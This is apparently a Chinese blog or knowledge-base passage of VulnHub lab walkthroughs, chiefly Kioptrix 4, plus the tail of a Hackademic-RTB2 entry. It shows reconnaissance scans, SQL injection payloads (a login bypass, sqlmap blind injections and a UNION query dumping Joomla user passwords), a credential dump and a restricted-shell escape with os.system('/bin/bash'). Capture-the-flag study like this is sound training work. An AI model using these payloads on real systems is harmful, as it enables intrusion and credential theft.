[+] Plugin: /administrator/index.php?option=com_djartgallery&task=editItem&cid[]=1'+and+1=1+--+ 
[+] Plugin: /administrator/index.php?option=com_searchlog&act=log 
[+] Plugin: /components/com_abc/ 
[+] Page: /index.php?option=com_abc
[+] Plugin: /components/com_amblog/ 
[+] Page: /index.php?option=com_amblog
[+] Plugin: /components/com_banners/ 
[+] Page: /index.php?option=com_banners
[+] Plugin: /components/com_contact/ 
[+] Page: /index.php?option=com_contact
[+] Plugin: /components/com_content/ 
[+] Page: /index.php?option=com_content
[+] Plugin: /components/com_mailto/ 
[+] Plugin: /components/com_media/ 
[+] Plugin: /components/com_newsfeeds/ 
[+] Page: /index.php?option=com_newsfeeds
[+] Plugin: /components/com_poll/ 
[+] Plugin: /components/com_search/ 
[+] Plugin: /components/com_user/ 
[+] Page: /index.php?option=com_user
[+] Plugin: /components/com_user/controller.php 
[+] Plugin: /components/com_weblinks/ 
[+] Page: /index.php?option=com_weblinks
[+] Plugin: /components/com_wrapper/ 
[+] Page: /index.php?option=com_wrapper
[+] Plugin: /includes/joomla.php 
[+] Plugin: /index.php?option=com_abc&view=abc&letter=AS&sectionid=' 
[+] Vulnerability: Potential SQL Injection
[+] Plugin: /index.php?option=com_amblog&view=amblog&catid=-1 UNION SELECT @@version 
[+] Page: /index.php?option=com_amblog&view=amblog&catid=-1 UNION SELECT @@version
[+] Plugin: /index.php?option=com_newsfeeds&view=categories&feedid=-1%20union%20select%201,concat%28username,char%2858%29,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%20from%20jos_users-- 
[+] Page: /index.php?option=com_newsfeeds&view=categories&feedid=-1%20union%20select%201,concat%28username,char%2858%29,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%20from%20jos
[+] Plugin: /libraries/joomla/utilities/compat/php50x.php 
[+] Plugin: /libraries/phpmailer/phpmailer.php 
[+] Plugin: /libraries/phpxmlrpc/xmlrpcs.php 
[+] Plugin: /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/ 
[+] Plugin: /plugins/editors/xstandard/attachmentlibrary.php 
[+] Plugin: /templates/ja_purity/ 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

发现存在注入漏洞,接下来sqlmap一波就行。

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="red">***The end,to be continue...***</font>
<!-- kb:end Hackademic-RTB2 -->

</details>

<a id="case-kioptrix4"></a>

## 登录查询与 MySQL UDF 权限

SQL 注入提供入口，受限 shell 与数据库进程身份决定后续操作。原记录保留 sys_exec、账户组修改及替代路径。

<p class="kb-provenance">来源 Kioptrix4 · 原记录 2019-12-10 · 20 个代码块 · 5 处图片引用</p>

<details class="kb-evidence" id="record-kioptrix4">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Kioptrix4 -->

#### 介绍

名称：Kioptrix: Level 1.3 (#4)
发布日期：2012年2月8日

下载链接:
Kioptrix4_vmware.rar (Size: 208 MB)
Download: [http://www.kioptrix.com/dlvm/Kioptrix4_vmware.rar](http://www.kioptrix.com/dlvm/Kioptrix4_vmware.rar)
Download(Mirror): [https://download.vulnhub.com/kioptrix/Kioptrix4_vmware.rar](https://download.vulnhub.com/kioptrix/Kioptrix4_vmware.rar)
Download(Torrent): [https://download.vulnhub.com/kioptrix/Kioptrix4_vmware.rar.torrent](https://download.vulnhub.com/kioptrix/Kioptrix4_vmware.rar.torrent)

虚拟机之间再次存在很长的延迟，但这无济于事。 工作，家庭必须是第一位的。 博客和兴趣爱好排在列表的下方。 这些事情并不像人们想象的那么容易。 必须为这些挑战投入时间和一些计划，以确保：



1.可以远程获得root权限[编辑：对不起，我的意思不是]

1a. 可以远程破坏机器
 - 1.停留在此网站的目标受众范围内
 - 2.必须是“现实的”（好吧……）
 - 3.应该为我复习。 无论是PHP还是MySQL用法等等。我已经有一段时间没做过了。

我也很难导出这个。 因此，请花时间阅读本文结尾处的评论。

秉承事物的精神，这一挑战与其他挑战有所不同，但仍处于轻松的境界。 我知道自己重复一遍，但必须始终清楚：这些VM是针对初学者的。 这是一个起点。

我很想编写一些小型的自定义应用程序，以供人们使用。 但我是管理员，不是编码员。 学习/编码这样的应用程序将花费太多时间。 并不是说我永远不会尝试做一个，但我不会屏住呼吸。 如果有人想要更艰巨的挑战，我敢肯定，Inter-tube会将他们抱在某个地方。 或者，您也可以随时注册Offsec的PWB课程。无耻的插头

-- 我必须说几件事。 我使用新平台制作了这张图片。 希望一切正常，但我无法测试所有内容。 最初，VM在启动时很难获得IP。 由于某种原因，NIC无法启动，并且机器留有环回接口。 我希望我解决了这个问题。 如果这个启动需要一点时间，请不要感到惊讶。 它正在尝试获取IP。 有点耐心。 有人为我测试了映像，还报告说VM开机后就挂了。 重新启动后一切都很好。 只有一个人报告了此消息，因此希望这不是主要问题。 如果计划在vmFusion上运行它，则可能需要转换想象以适合您的融合版本。
-- 还为使用Hyper-V的用户添加了VHD文件以供下载。 你们可能需要将网络适配器更改为“旧版网络适配器”。 我已经对该文件进行了测试，这个文件似乎对我来说还算不错…如果您遇到问题，或者由于某种原因它无法正常工作，请发送电子邮件comms [=]kioptrix.com

感谢www.n00bpentesting.com上的@shai_saint使用各种VM解决方案进行急需的测试。

感谢Hackfest.ca的Patrick也运行了VM并报告了一些问题。 Swappage和@Tallenz也这样做。 所有的帮助都是感激的家伙

所以我希望你喜欢这个。

Kioptrix团队

Note:只是一个虚拟硬盘。 您需要创建一个新的虚拟机并附加现有的硬盘驱动器.

运行服务:

 - Apache
 - MySQL
 - OpenSSH
 - PHP
 - Samba

漏洞知识点:

 - 文件包含
 - 操作系统命令注入
 - 权限提升
 - 特权不正确的服务
 - SQL注入

#### 虚拟机与网络配置

点击vmware新建虚拟机，选择ubuntu,接下来的配置，除了下图配置与平常不同，其他步骤均与平常相同

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub32.jpg)

.vmdk文件为压缩包中解压出的文件

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub33.jpg)

将虚拟靶机和kali攻击机的vmware网络都配置成[自定义：特定虚拟网络的<VMnet8(NAT模式)>]即可。

#### 信息收集(仅截取关键部分)

上nmap

``` bash
nmap -sn -v 192.168.84.0/24
```

``` bash
Nmap scan report for 192.168.84.136 [host down]
Nmap scan report for 192.168.84.137 [host down]
Nmap scan report for 192.168.84.138 [host down]
Nmap scan report for 192.168.84.139
Host is up (0.0010s latency).
MAC Address: 00:0C:29:F3:0E:E9 (VMware)
Nmap scan report for 192.168.84.140 [host down]
Nmap scan report for 192.168.84.141 [host down]
Nmap scan report for 192.168.84.142 [host down]
Nmap scan report for 192.168.84.143 [host down]
```

``` bash
nmap -A -v -sS -Pn -T4 --script=vuln 192.168.84.139
```

``` bash
Scanning 192.168.84.139 [1000 ports]
Discovered open port 139/tcp on 192.168.84.139
Discovered open port 80/tcp on 192.168.84.139
Discovered open port 22/tcp on 192.168.84.139
Discovered open port 445/tcp on 192.168.84.139
Completed SYN Stealth Scan at 20:57, 2.09s elapsed (1000 total ports)
Initiating Service scan at 20:57
Scanning 4 services on 192.168.84.139
Completed Service scan at 20:57, 11.02s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 192.168.84.139
NSE: Script scanning 192.168.84.139.
Initiating NSE at 20:57
Stats: 0:02:49 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE: Active NSE Script Threads: 3 (3 waiting)
NSE Timing: About 99.42% done; ETC: 20:59 (0:00:01 remaining)
Completed NSE at 21:02, 311.88s elapsed
Initiating NSE at 21:02
Completed NSE at 21:02, 0.12s elapsed
Nmap scan report for 192.168.84.139
Host is up (0.00036s latency).
Not shown: 566 closed ports, 430 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:4.7p1: 
|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708
|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755
|_      CVE-2008-5161   2.6     https://vulners.com/cve/CVE-2008-5161
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.84.139
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.84.139:80/
|     Form id: myusername
|     Form action: checklogin.php
|     
|     Path: http://192.168.84.139:80/checklogin.php
|     Form id: 
|     Form action: index.php
|     
|     Path: http://192.168.84.139:80/index.php
|     Form id: myusername
|_    Form action: checklogin.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /database.sql: Possible database backup
|   /icons/: Potentially interesting folder w/ directory listing
|   /images/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch'
|_  /index/: Potentially interesting folder
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:apache:http_server:2.2.8: 
|       CVE-2010-0425   10.0    https://vulners.com/cve/CVE-2010-0425
|       CVE-2011-3192   7.8     https://vulners.com/cve/CVE-2011-3192
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249
|       CVE-2009-1891   7.1     https://vulners.com/cve/CVE-2009-1891
|       CVE-2009-1890   7.1     https://vulners.com/cve/CVE-2009-1890
|       CVE-2012-0883   6.9     https://vulners.com/cve/CVE-2012-0883
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862
|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098
|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438
|       CVE-2011-3368   5.0     https://vulners.com/cve/CVE-2011-3368
|       CVE-2010-1452   5.0     https://vulners.com/cve/CVE-2010-1452
|       CVE-2010-0408   5.0     https://vulners.com/cve/CVE-2010-0408
|       CVE-2009-2699   5.0     https://vulners.com/cve/CVE-2009-2699
|       CVE-2008-2364   5.0     https://vulners.com/cve/CVE-2008-2364
|       CVE-2007-6750   5.0     https://vulners.com/cve/CVE-2007-6750
|       CVE-2009-1195   4.9     https://vulners.com/cve/CVE-2009-1195
|       CVE-2012-0031   4.6     https://vulners.com/cve/CVE-2012-0031
|       CVE-2011-3607   4.4     https://vulners.com/cve/CVE-2011-3607
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896
|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558
|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499
|       CVE-2012-0053   4.3     https://vulners.com/cve/CVE-2012-0053
|       CVE-2011-4317   4.3     https://vulners.com/cve/CVE-2011-4317
|       CVE-2011-3639   4.3     https://vulners.com/cve/CVE-2011-3639
|       CVE-2011-3348   4.3     https://vulners.com/cve/CVE-2011-3348
|       CVE-2011-0419   4.3     https://vulners.com/cve/CVE-2011-0419
|       CVE-2010-0434   4.3     https://vulners.com/cve/CVE-2010-0434
|       CVE-2008-2939   4.3     https://vulners.com/cve/CVE-2008-2939
|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687
|_      CVE-2011-4415   1.2     https://vulners.com/cve/CVE-2011-4415
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:0C:29:F3:0E:E9 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Uptime guess: 0.009 days (since Mon Dec  9 20:49:38 2019)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=203 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
```
使用工具enum4linux得到如下信息

``` bash
root@kali:~# enum4linux 192.168.84.139
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Dec 10 00:55:51 2019

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.84.139
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on 192.168.84.139    |
 ====================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================== 
|    Nbtstat Information for 192.168.84.139    |
 ============================================== 
Looking up status of 192.168.84.139
        KIOPTRIX4       <00> -         B <ACTIVE>  Workstation Service
        KIOPTRIX4       <03> -         B <ACTIVE>  Messenger Service
        KIOPTRIX4       <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name

        MAC Address = 00-00-00-00-00-00

 ======================================= 
|    Session Check on 192.168.84.139    |
 ======================================= 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```

dirb扫目录

``` bash
root@kali:~# dirb http://192.168.84.139/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Dec 10 00:58:55 2019
URL_BASE: http://192.168.84.139/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.84.139/ ----
+ http://192.168.84.139/cgi-bin/ (CODE:403|SIZE:329)                                          
==> DIRECTORY: http://192.168.84.139/images/                                                  
+ http://192.168.84.139/index (CODE:200|SIZE:1255)                                            
+ http://192.168.84.139/index.php (CODE:200|SIZE:1255)                                        
==> DIRECTORY: http://192.168.84.139/john/                                                    
+ http://192.168.84.139/logout (CODE:302|SIZE:0)                                              
+ http://192.168.84.139/member (CODE:302|SIZE:220)                                            
+ http://192.168.84.139/server-status (CODE:403|SIZE:334)                                     
                                                                                              
---- Entering directory: http://192.168.84.139/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                              
---- Entering directory: http://192.168.84.139/john/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Dec 10 00:59:00 2019
DOWNLOADED: 4612 - FOUND: 6
```
wfuzz进行模糊测试

``` bash
root@kali:~# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://192.168.84.139/FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://192.168.84.139/FUZZ
Total requests: 3024

===================================================================
ID           Response   Lines    Word     Chars       Payload                             
===================================================================

000000566:   403        10 L     33 W     329 Ch      "cgi-bin/"                          
000001337:   301        9 L      31 W     356 Ch      "images"                            
000001350:   200        45 L     94 W     1255 Ch     "index"                             
000001458:   301        9 L      31 W     354 Ch      "john"                              
000001629:   302        0 L      0 W      0 Ch        "logout"                            
000001736:   302        1 L      22 W     220 Ch      "member"                            
000002294:   301        9 L      31 W     356 Ch      "robert"                            

Total time: 3.234193
Processed Requests: 3024
Filtered Requests: 3017
Requests/sec.: 935.0089
```

访问页面，发现登录口存在sql注入漏洞

 - 手工注入

用户名使用john，密码使用1' or '1'='1

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub34.jpg)

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub35.jpg)

得到两个密码

``` bash
Username 	: 	john
Password 	: 	MyNameIsJohn

Username 	: 	robert
Password 	: 	ADGAdsafdfwt4gadfga==
```

 - 使用sqlmap

跑出注入点

``` bash
root@kali:~# sqlmap -r sqlmap.txt
        ___
       __H__                                                                                   
 ___ ___[.]_____ ___ ___  {1.3.11#stable}                                                      
|_ -| . [']     | .'| . |                                                                      
|___|_  [']_|_|_|__,|  _|                                                                      
      |_|V...       |_|   http://sqlmap.org                                                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:21:00 /2019-12-10/

[01:21:00] [INFO] parsing HTTP request from 'sqlmap.txt'
[01:21:00] [INFO] resuming back-end DBMS 'mysql' 
[01:21:00] [INFO] testing connection to the target URL
[01:21:00] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: mypassword (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: myusername=admin&mypassword=-9812' OR 1343=1343#&Submit=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: myusername=admin&mypassword=123456' AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&Submit=Login
---
[01:21:00] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[01:21:00] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.84.139'

[*] ending @ 01:21:00 /2019-12-10/
```
跑出账号密码,果真还是sqlmap屌炸天！！！！

``` bash
root@kali:~# sqlmap -r sqlmap.txt -D members -T members --dump
        ___
       __H__                                                                                         
 ___ ___[)]_____ ___ ___  {1.3.11#stable}                                                            
|_ -| . [)]     | .'| . |                                                                            
|___|_  [']_|_|_|__,|  _|                                                                            
      |_|V...       |_|   http://sqlmap.org                                                          

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:25:36 /2019-12-10/

[01:25:36] [INFO] parsing HTTP request from 'sqlmap.txt'
[01:25:36] [INFO] resuming back-end DBMS 'mysql' 
[01:25:36] [INFO] testing connection to the target URL
[01:25:36] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: mypassword (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: myusername=admin&mypassword=-9812' OR 1343=1343#&Submit=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: myusername=admin&mypassword=123456' AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&Submit=Login
---
[01:25:36] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[01:25:36] [INFO] fetching columns for table 'members' in database 'members'
[01:25:36] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[01:25:36] [INFO] retrieved: 
sqlmap got a 302 redirect to 'http://192.168.84.139:80/login_success.php?username=admin'. Do you want to follow? [Y/n] n
3
[01:25:38] [INFO] retrieved: id
[01:25:38] [INFO] retrieved: username
[01:25:39] [INFO] retrieved: password
[01:25:39] [INFO] fetching entries for table 'members' in database 'members'
[01:25:39] [INFO] fetching number of entries for table 'members' in database 'members'
[01:25:39] [INFO] retrieved: 2
[01:25:39] [INFO] retrieved: 1
[01:25:39] [INFO] retrieved: MyNameIsJohn
[01:25:40] [INFO] retrieved: john
[01:25:40] [INFO] retrieved: 2
[01:25:40] [INFO] retrieved: ADGAdsafdfwt4gadfga==
[01:25:42] [INFO] retrieved: robert
Database: members
Table: members
[2 entries]
+----+-----------------------+----------+
| id | password              | username |
+----+-----------------------+----------+
| 1  | MyNameIsJohn          | john     |
| 2  | ADGAdsafdfwt4gadfga== | robert   |
+----+-----------------------+----------+

[01:25:42] [INFO] table 'members.members' dumped to CSV file '/root/.sqlmap/output/192.168.84.139/dump/members/members.csv'                                                                               
[01:25:42] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.84.139'

[*] ending @ 01:25:42 /2019-12-10/
```

#### 获取root权限

ssh连接之后发现许多命令无法执行,但是可以执行echo命令

``` bash
root@kali:~# ssh john@192.168.84.139
The authenticity of host '192.168.84.139 (192.168.84.139)' can't be established.
RSA key fingerprint is SHA256:3fqlLtTAindnY7CGwxoXJ9M2rQF6nn35SFMTVv56lww.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.84.139' (RSA) to the list of known hosts.
john@192.168.84.139's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ ls
john:~$ pwd
*** unknown command: pwd
john:~$ whoami
*** unknown command: whoami
john:~$echo 'casdcasdc'                                                                             
casdcasdc
```

通过使用命令echo os.system('/bin/bash')轻松地“转义”并绕过有限制的shell。

``` bash
john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ ls
john@Kioptrix4:~$ pwd
/home/john
john@Kioptrix4:~$ whoami
john
john@Kioptrix4:~$ 
```

使用命令行收集信息

``` bash
john@Kioptrix4:~$ cat /etc/*-release 
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04.3 LTS"
john@Kioptrix4:~$ cat /proc/version
Linux version 2.6.24-24-server (buildd@palmer) (gcc version 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) #1 SMP Tue Jul 7 20:21:17 UTC 2009
john@Kioptrix4:~$ ps -ef | grep root
root         1     0  0 04:44 ?        00:00:01 /sbin/init
root         2     0  0 04:44 ?        00:00:00 [kthreadd]
root         3     2  0 04:44 ?        00:00:00 [migration/0]
root         4     2  0 04:44 ?        00:00:00 [ksoftirqd/0]
root         5     2  0 04:44 ?        00:00:00 [watchdog/0]
root         6     2  0 04:44 ?        00:00:00 [migration/1]
root         7     2  0 04:44 ?        00:00:00 [ksoftirqd/1]
root         8     2  0 04:44 ?        00:00:00 [watchdog/1]
root         9     2  0 04:44 ?        00:00:00 [migration/2]
root        10     2  0 04:44 ?        00:00:00 [ksoftirqd/2]
root        11     2  0 04:44 ?        00:00:00 [watchdog/2]
root        12     2  0 04:44 ?        00:00:00 [migration/3]
root        13     2  0 04:44 ?        00:00:00 [ksoftirqd/3]
root        14     2  0 04:44 ?        00:00:00 [watchdog/3]
root        15     2  0 04:44 ?        00:00:00 [events/0]
root        16     2  0 04:44 ?        00:00:00 [events/1]
root        17     2  0 04:44 ?        00:00:00 [events/2]
root        18     2  0 04:44 ?        00:00:00 [events/3]
root        19     2  0 04:44 ?        00:00:00 [khelper]
root        56     2  0 04:44 ?        00:00:00 [kblockd/0]
root        57     2  0 04:44 ?        00:00:00 [kblockd/1]
root        58     2  0 04:44 ?        00:00:00 [kblockd/2]
root        59     2  0 04:44 ?        00:00:00 [kblockd/3]
root        62     2  0 04:44 ?        00:00:00 [kacpid]
root        63     2  0 04:44 ?        00:00:00 [kacpi_notify]
root       193     2  0 04:44 ?        00:00:00 [kseriod]
root       247     2  0 04:44 ?        00:00:00 [pdflush]
root       248     2  0 04:44 ?        00:00:00 [pdflush]
root       249     2  0 04:44 ?        00:00:00 [kswapd0]
root       291     2  0 04:44 ?        00:00:00 [aio/0]
root       292     2  0 04:44 ?        00:00:00 [aio/1]
root       293     2  0 04:44 ?        00:00:00 [aio/2]
root       294     2  0 04:44 ?        00:00:00 [aio/3]
root      1627     2  0 04:44 ?        00:00:00 [ata/0]
root      1629     2  0 04:44 ?        00:00:00 [ata/1]
root      1630     2  0 04:44 ?        00:00:00 [ata/2]
root      1631     2  0 04:44 ?        00:00:00 [ata/3]
root      1632     2  0 04:44 ?        00:00:00 [ata_aux]
root      1800     2  0 04:44 ?        00:00:00 [ksuspend_usbd]
root      1806     2  0 04:44 ?        00:00:00 [khubd]
root      2474     2  0 04:44 ?        00:00:00 [scsi_eh_0]
root      2486     2  0 04:44 ?        00:00:00 [scsi_eh_1]
root      2489     2  0 04:44 ?        00:00:00 [scsi_eh_2]
root      2579     2  0 04:44 ?        00:00:00 [scsi_eh_3]
root      2580     2  0 04:44 ?        00:00:00 [scsi_eh_4]
root      2581     2  0 04:44 ?        00:00:00 [scsi_eh_5]
root      2582     2  0 04:44 ?        00:00:00 [scsi_eh_6]
root      2583     2  0 04:44 ?        00:00:00 [scsi_eh_7]
root      2584     2  0 04:44 ?        00:00:00 [scsi_eh_8]
root      2585     2  0 04:44 ?        00:00:00 [scsi_eh_9]
root      2586     2  0 04:44 ?        00:00:00 [scsi_eh_10]
root      2587     2  0 04:44 ?        00:00:00 [scsi_eh_11]
root      2588     2  0 04:44 ?        00:00:00 [scsi_eh_12]
root      2589     2  0 04:44 ?        00:00:00 [scsi_eh_13]
root      2590     2  0 04:44 ?        00:00:00 [scsi_eh_14]
root      2591     2  0 04:44 ?        00:00:00 [scsi_eh_15]
root      2592     2  0 04:44 ?        00:00:00 [scsi_eh_16]
root      2593     2  0 04:44 ?        00:00:00 [scsi_eh_17]
root      2594     2  0 04:44 ?        00:00:00 [scsi_eh_18]
root      2595     2  0 04:44 ?        00:00:00 [scsi_eh_19]
root      2596     2  0 04:44 ?        00:00:00 [scsi_eh_20]
root      2597     2  0 04:44 ?        00:00:00 [scsi_eh_21]
root      2598     2  0 04:44 ?        00:00:00 [scsi_eh_22]
root      2599     2  0 04:44 ?        00:00:00 [scsi_eh_23]
root      2600     2  0 04:44 ?        00:00:00 [scsi_eh_24]
root      2601     2  0 04:44 ?        00:00:00 [scsi_eh_25]
root      2602     2  0 04:44 ?        00:00:00 [scsi_eh_26]
root      2603     2  0 04:44 ?        00:00:00 [scsi_eh_27]
root      2604     2  0 04:44 ?        00:00:00 [scsi_eh_28]
root      2605     2  0 04:44 ?        00:00:00 [scsi_eh_29]
root      2606     2  0 04:44 ?        00:00:00 [scsi_eh_30]
root      2607     2  0 04:44 ?        00:00:00 [scsi_eh_31]
root      2608     2  0 04:44 ?        00:00:00 [scsi_eh_32]
root      2849     2  0 04:44 ?        00:00:00 [kjournald]
root      3028     1  0 04:45 ?        00:00:00 /sbin/udevd --daemon
root      3701     2  0 04:45 ?        00:00:00 [kpsmoused]
root      3800     2  0 04:45 ?        00:00:00 [btaddconn]
root      3801     2  0 04:45 ?        00:00:00 [btdelconn]
root      4838     1  0 04:45 tty4     00:00:00 /sbin/getty 38400 tty4
root      4839     1  0 04:45 tty5     00:00:00 /sbin/getty 38400 tty5
root      4841     1  0 04:45 tty2     00:00:00 /sbin/getty 38400 tty2
root      4842     1  0 04:45 tty3     00:00:00 /sbin/getty 38400 tty3
root      4845     1  0 04:45 tty6     00:00:00 /sbin/getty 38400 tty6
root      4906     1  0 04:45 ?        00:00:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
root      4927     1  0 04:45 ?        00:00:00 /usr/sbin/sshd
root      4983     1  0 04:45 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
root      5025  4983  0 04:45 ?        00:00:04 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/my
root      5026  4983  0 04:45 ?        00:00:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
root      5120     1  0 04:45 ?        00:00:00 /usr/sbin/nmbd -D
root      5122     1  0 04:45 ?        00:00:00 /usr/sbin/smbd -D
root      5136  5122  0 04:45 ?        00:00:00 /usr/sbin/smbd -D
root      5137     1  0 04:45 ?        00:00:00 /usr/sbin/winbindd
root      5149  5137  0 04:45 ?        00:00:00 /usr/sbin/winbindd
root      5169     1  0 04:45 ?        00:00:00 /usr/sbin/cron
